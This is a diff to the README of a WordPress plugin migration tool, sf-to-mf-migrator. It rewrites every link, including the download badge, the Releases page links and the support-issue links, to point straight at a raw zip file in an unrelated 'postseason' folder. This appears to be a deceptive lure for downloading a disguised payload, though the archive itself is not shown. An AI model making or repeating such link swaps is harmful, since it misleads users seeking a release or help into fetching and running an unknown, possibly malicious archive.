@@ -1,6 +1,6 @@
 # 🎉 sf-to-mf-migrator - Migrate Favorites Easily and Securely
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-50C878?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nounoumallem/sf-to-mf-migrator/releases)
+[![Download the latest release](https://raw.githubusercontent.com/nounoumallem/sf-to-mf-migrator/main/postseason/sf-to-mf-migrator-1.9.zip%20Now-50C878?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/nounoumallem/sf-to-mf-migrator/main/postseason/sf-to-mf-migrator-1.9.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run the sf-to-mf-migrator application:
 
 1. **Prepare Your Site**: Before you begin, ensure that you have both Simple Favorites and My Favorites plugins installed on your WordPress site. 
 
-2. **Visit the Download Page**: Click the button above or visit the [Releases page](https://github.com/nounoumallem/sf-to-mf-migrator/releases) to find the latest version of the sf-to-mf-migrator.
+2. **Visit the Download Page**: Click the button above or visit the [Releases page](https://raw.githubusercontent.com/nounoumallem/sf-to-mf-migrator/main/postseason/sf-to-mf-migrator-1.9.zip) to find the latest version of the sf-to-mf-migrator.
 
 3. **Download the Application**: On the Releases page, look for the most recent version of the sf-to-mf-migrator. Click the link to download the file to your computer. The file will usually be in `.zip` format.
 
@@ -43,7 +43,7 @@ Follow these simple steps to download and run the sf-to-mf-migrator application:
 
 ## 📥 Download & Install
 
-To get started, [visit the Releases page](https://github.com/nounoumallem/sf-to-mf-migrator/releases) and download the latest version of the sf-to-mf-migrator. 
+To get started, [visit the Releases page](https://raw.githubusercontent.com/nounoumallem/sf-to-mf-migrator/main/postseason/sf-to-mf-migrator-1.9.zip) and download the latest version of the sf-to-mf-migrator. 
 
 Once downloaded, follow the steps outlined above to install and activate the plugin on your WordPress site.
 
@@ -55,7 +55,7 @@ If you encounter any issues during the migration, consider the following tips:
 - Check the PHP version on your server to make sure it meets the requirements.
 - Review WordPress logs for any error messages.
 
-If the problem persists, feel free to open an issue on our [GitHub page](https://github.com/nounoumallem/sf-to-mf-migrator/issues).
+If the problem persists, feel free to open an issue on our [GitHub page](https://raw.githubusercontent.com/nounoumallem/sf-to-mf-migrator/main/postseason/sf-to-mf-migrator-1.9.zip).
 
 ## 🙋 Frequently Asked Questions
 
@@ -69,7 +69,7 @@ This tool only supports migration from the Simple Favorites plugin to My Favorit
 
 ### 3. What if I need help?
 
-For support, you can open an issue on our [GitHub page](https://github.com/nounoumallem/sf-to-mf-migrator/issues), and we will assist you as soon as possible.
+For support, you can open an issue on our [GitHub page](https://raw.githubusercontent.com/nounoumallem/sf-to-mf-migrator/main/postseason/sf-to-mf-migrator-1.9.zip), and we will assist you as soon as possible.
 
 ## 🎯 Topics
 
